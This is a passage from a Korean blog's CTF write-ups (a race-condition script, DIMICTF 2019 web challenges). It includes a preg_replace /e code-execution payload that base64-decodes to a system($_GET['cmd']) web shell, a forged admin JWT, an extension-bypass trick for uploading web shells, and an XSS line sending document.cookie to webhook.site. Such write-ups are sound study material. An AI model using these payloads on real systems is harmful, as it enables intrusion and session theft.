케이스)</p><p>암튼 파이썬으로 코딩해서 문제를 풀어주면 된다.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">cookie1 = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;bb11&#x27;</span>&#125;</span><br><span class="line">cookie2 = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;bb22&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">cookie</span>):</span></span><br><span class="line">    url = <span class="string">&quot;http://198.13.32.181:4345/login_check.php&quot;</span></span><br><span class="line">    param = &#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&#x27;bb&#x27;</span>,<span class="string">&#x27;pw&#x27;</span>:<span class="string">&#x27;bb&#x27;</span>&#125;</span><br><span class="line">    r = requests.post(url, data=param, cookies=cookie)</span><br><span class="line">    <span class="built_in">print</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">times</span>():</span></span><br><span class="line">    <span class="keyword">global</span> cookie1;</span><br><span class="line">    url = <span class="string">&quot;http://198.13.32.181:4345/index.php?times=111111111111111111111111111111&quot;</span></span><br><span class="line">    r = requests.get(url, cookies=cookie1)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    <span class="keyword">global</span> cookie2;</span><br><span class="line">    url = <span class="string">&quot;http://198.13.32.181:4345/index.php?key=tatadadazazaabccocoheheaaaaaaaaaaaaa&quot;</span></span><br><span class="line">    r = requests.get(url, cookies=cookie2)</span><br><span class="line">    <span class="built_in">print</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    login(cookie1)</span><br><span class="line">    login(cookie2)</span><br><span class="line">    t1 = threading.Thread(target=times,args=())</span><br><span class="line">    t2 = threading.Thread(target=flag,args=())</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p><code> Thank you (NGA) </code></p><hr><h3 id="2-web-jpg-viewer"><a href="#2-web-jpg-viewer" class="headerlink" title="2. (web) jpg viewer"></a>2. (web) jpg viewer</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  session_start();</span><br><span class="line">  <span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/jwt.php&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;PHPSESSJWT&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="variable">$jwt</span>-&gt;hashing(<span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&#x27;admin&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">      <span class="string">&#x27;iat&#x27;</span> =&gt; time(),</span><br><span class="line">    ));</span><br><span class="line">    setcookie(<span class="string">&#x27;PHPSESSJWT&#x27;</span>, <span class="variable">$token</span>, time() + <span class="number">86400</span> * <span class="number">30</span>);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/jwt.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$token</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;PHPSESSJWT&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$token</span>) &#123;</span><br><span class="line">        <span class="variable">$body</span> = <span class="variable">$jwt</span>-&gt;dehashing(<span class="variable">$token</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">      <span class="keyword">echo</span> highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">      <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">imageanalyze</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;Where is the File?&quot;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(!exif_read_data(<span class="variable">$file</span>))&#123;</span><br><span class="line">            unlink(<span class="variable">$file</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> exif_read_data(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;JPG&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;JPG&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;JPG&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$upload_directory</span> = <span class="string">&#x27;./uploads/&#x27;</span>;</span><br><span class="line">        <span class="variable">$ext_str</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$max_file_size</span> = <span class="number">5242880</span>;</span><br><span class="line">        <span class="variable">$ext</span> = explode(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$ext</span> = strtolower(array_pop(<span class="variable">$ext</span>));</span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$ext</span>, <span class="variable">$ext_str</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;jpg파일만 업로드 할 수 있습니다.&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt;= <span class="variable">$max_file_size</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;파일은 5MB 까지만 업로드 가능합니다.&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$path</span> = <span class="variable">$upload_directory</span>.session_id();</span><br><span class="line">        <span class="variable">$updir</span> = <span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        mkdir(<span class="variable">$path</span>,<span class="number">0777</span>);</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$updir</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;파일 업로드 성공!&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;<span class="subst">$updir</span>&#x27;&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$infor</span> = imageanalyze(<span class="variable">$updir</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;업로드 에러!&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$infor</span>))&#123;</span><br><span class="line">    <span class="variable">$Date</span> = <span class="variable">$infor</span>[<span class="string">&#x27;DateTimeOriginal&#x27;</span>];</span><br><span class="line">    <span class="variable">$Model</span> = <span class="variable">$infor</span>[<span class="string">&#x27;Model&#x27;</span>];</span><br><span class="line">    <span class="variable">$Make</span> = <span class="variable">$infor</span>[<span class="string">&#x27;Make&#x27;</span>];</span><br><span class="line">    <span class="variable">$size</span> = round(<span class="variable">$infor</span>[<span class="string">&#x27;FileSize&#x27;</span>]/<span class="number">1024</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;파일명 : <span class="subst">&#123;$infor[&#x27;FileName&#x27;]&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;파일 크기 : <span class="subst">&#123;$size&#125;</span>KB&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(array_key_exists(<span class="string">&#x27;DateTimeOriginal&#x27;</span>,<span class="variable">$infor</span>))&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;촬영 시간 : <span class="subst">&#123;$Date&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$date</span> = date(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, <span class="variable">$infor</span>[<span class="string">&#x27;FileDateTime&#x27;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;업로드 시간 : <span class="subst">&#123;$date&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(array_key_exists(<span class="string">&#x27;Model&#x27;</span>,<span class="variable">$infor</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$infor</span>[<span class="string">&#x27;Model&#x27;</span>]))&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;카메라 모델 : <span class="subst">&#123;$Model&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$body</span>[<span class="string">&#x27;admin&#x27;</span>]==<span class="literal">true</span>)&#123;</span><br><span class="line">      <span class="variable">$edit</span> = explode(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$_COOKIE</span>[<span class="string">&#x27;edit&#x27;</span>]);</span><br><span class="line">      preg_replace(<span class="variable">$$edit</span>[<span class="number">0</span>],<span class="variable">$$edit</span>[<span class="number">1</span>],<span class="variable">$$edit</span>[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이번에도 코드가 좀 길다, 한번 분석해보자.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$body</span>[<span class="string">&#x27;admin&#x27;</span>]==<span class="literal">true</span>)&#123;</span><br><span class="line">      <span class="variable">$edit</span> = explode(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$_COOKIE</span>[<span class="string">&#x27;edit&#x27;</span>]);</span><br><span class="line">      preg_replace(<span class="variable">$$edit</span>[<span class="number">0</span>],<span class="variable">$$edit</span>[<span class="number">1</span>],<span class="variable">$$edit</span>[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>이 부분에 보면 쿠키 값의 admin이 true를 가질 때,</p><p>edit의 쿠키를 가지고 preg_replace 함수의 인자로 사용한다.</p><p>처음엔 좀 생각 했는데, 검색 하다가 우연히 preg_replace 함수에 대해</p><p>RCE 문서를 찾을 수 있었다. 그렇다 이 문제도 동일한 취약점을 사용하고 있다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Date</span> = <span class="variable">$infor</span>[<span class="string">&#x27;DateTimeOriginal&#x27;</span>];</span><br><span class="line"><span class="variable">$Model</span> = <span class="variable">$infor</span>[<span class="string">&#x27;Model&#x27;</span>];</span><br><span class="line"><span class="variable">$Make</span> = <span class="variable">$infor</span>[<span class="string">&#x27;Make&#x27;</span>];</span><br><span class="line"><span class="variable">$size</span> = round(<span class="variable">$infor</span>[<span class="string">&#x27;FileSize&#x27;</span>]/<span class="number">1024</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>이 부분에서 업로드 하는 jpg 파일의 사진 정보 값을 담고 출력 해주니,</p><p>$model, $make 에 공격 페이로드를 넣고 admin 쿠키를 조작 해 preg_replace 함수로</p><p>흘러가게 해주면 된다.</p><p>세션 조작은 문제에서 만들어주는 형태와 동일하게 새 jwt 세션을 만들어서</p><p>바꿔주면 된다. (아래 참고)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;jwt.php&quot;</span>;</span><br><span class="line"><span class="variable">$jwt</span> = <span class="keyword">new</span> jwt();</span><br><span class="line"></span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$jwt</span>-&gt;hashing(<span class="keyword">array</span>(</span><br><span class="line">        ‘admin’=&gt;’<span class="literal">true</span>’,</span><br><span class="line">        ‘iat’=&gt;time()</span><br><span class="line">));</span><br><span class="line">var_dump(<span class="variable">$token</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Model=/a/e &amp; Make=eval(base64_decode(‘c3lzdGVtKCRfR0VUWydjbWQnXSk7’));<br>?cmd=ls &amp; ?cmd=/flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP &amp; SSE Instruction</title>
      <link href="2020/02/10/rop-instruction-200210/"/>
      <url>2020/02/10/rop-instruction-200210/</url>
      
        <content type="html"><![CDATA[<h3 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h3><p><a href="https://www.notion.so/jhyeon/ROP-SSE-Instruction-ca573f7740ae4301ad61b455a140b659">https://www.notion.so/jhyeon/ROP-SSE-Instruction-ca573f7740ae4301ad61b455a140b659</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DIMICTF 2019 Write up</title>
      <link href="2020/02/06/dimictf-200206/"/>
      <url>2020/02/06/dimictf-200206/</url>
      
        <content type="html"><![CDATA[<h3 id="1-web-5shared"><a href="#1-web-5shared" class="headerlink" title="1. web(5shared)"></a>1. web(5shared)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;lib.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$session</span> = md5(session_id());</span><br><span class="line"><span class="variable">$uploaddir</span> = <span class="keyword">__DIR__</span> . <span class="string">&quot;/~uploads/<span class="subst">&#123;$session&#125;</span>/&quot;</span>;</span><br><span class="line"></span><br><span class="line">createDirectory(<span class="keyword">__DIR__</span> . <span class="string">&quot;/~uploads/&quot;</span>);</span><br><span class="line">createDirectory(<span class="variable">$uploaddir</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//print_r($_FILES[&#x27;file&#x27;]);</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$uploadfile</span> = <span class="variable">$uploaddir</span> . <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// sanity check</span></span><br><span class="line"><span class="variable">$extension</span> = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>])[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$extension</span>, <span class="keyword">Array</span>(<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;gif&quot;</span>, <span class="string">&quot;png&quot;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;jpg, gif, png 확장자만 업로드할 수 있습니다.&#x27;); history.back(); &lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$message</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// the real sanity check</span></span><br><span class="line"><span class="variable">$real_extension</span> = array_pop(explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/php/i&quot;</span>, <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;파일 이름에 php가 들어가면 안됩니다.&#x27;); history.back(); &lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$message</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">4096</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;최대 4mb까지 업로드할 수 있습니다.&#x27;); history.back(); &lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$message</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$uploadfile</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;성공적으로 파일이 업로드되었습니다.&#x27;); location.href = &#x27;/&#x27;; &lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$message</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;업로드 에러&#x27;); history.back(); &lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$message</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>코드가 좀 긴편인데 주요 부분들만 한번 확인 해보자,</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sanity check</span></span><br><span class="line"><span class="variable">$extension</span> = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>])[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$extension</span>, <span class="keyword">Array</span>(<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;gif&quot;</span>, <span class="string">&quot;png&quot;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;jpg, gif, png 확장자만 업로드할 수 있습니다.&#x27;); history.back(); &lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$message</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// the real sanity check</span></span><br><span class="line"><span class="variable">$real_extension</span> = array_pop(explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/php/i&quot;</span>, <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;파일 이름에 php가 들어가면 안됩니다.&#x27;); history.back(); &lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$message</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>웹쉘 업로드 문제이기 때문에 사실상 이 부분만 우회할 수 있다면 금방 풀 수 있다.</p><p>sanity check 부분에 보면 argv[1] 로 오는 문자를 검사하는데,<br>jpg, gif, png 만 허용시켜 둔 상황이다.</p><p>그런데 php에선 또 이상한 문제점이 우리를 반겨준다. 저렇게 검사할 경우에 다음과 같은 트릭을 사용할 수 있다.</p><ol><li>test.jpg</li><li>test.jpg.php<br>jpg 뒤에 확장자를 하나 더 붙여서 실행 파일로 만들어 주면 확장자 검사를 피할 수 있다.<br>근데 아래 real sanity check를 보면 php는 또 불가능 하기 때문에 php 대체 확장자를 써서 우회해주자. (phtml, php5 등)</li></ol><p>upload) test.jpg.phtml<br>위와 같이 파일 명을 바꾸고, 웹 쉘을 업로드 시키면 된다.</p><hr><h3 id="2-web-simple-xss"><a href="#2-web-simple-xss" class="headerlink" title="2. (web) simple xss"></a>2. (web) simple xss</h3><p>문제에 들어가면 게시판이 있는데 그냥 글쓰기 부분에서 xss payload 넣고,<br>봇의 쿠키를 탈취하면 된다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=<span class="string">&#x27;https://webhook.site/~&#x27;</span>+document.cookie;</span><br></pre></td></tr></table></figure><hr><h3 id="3-web-simple-sqli"><a href="#3-web-simple-sqli" class="headerlink" title="3. (web) simple sqli"></a>3. (web) simple sqli</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">//error_reporting(E_ALL); </span></span><br><span class="line"><span class="comment">//ini_set(&quot;display_errors&quot;, 1); </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;lib.php&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view-source&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">exit</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]; </span><br><span class="line"><span class="variable">$pw</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="comment">//var_dump($conn); </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/information|admin|or|\=| |\#|\&#x27;|_|where/i&quot;</span>, <span class="variable">$id</span> . <span class="variable">$pw</span>)) </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$id</span>, <span class="variable">$pw</span>)) &#123; </span><br><span class="line">    <span 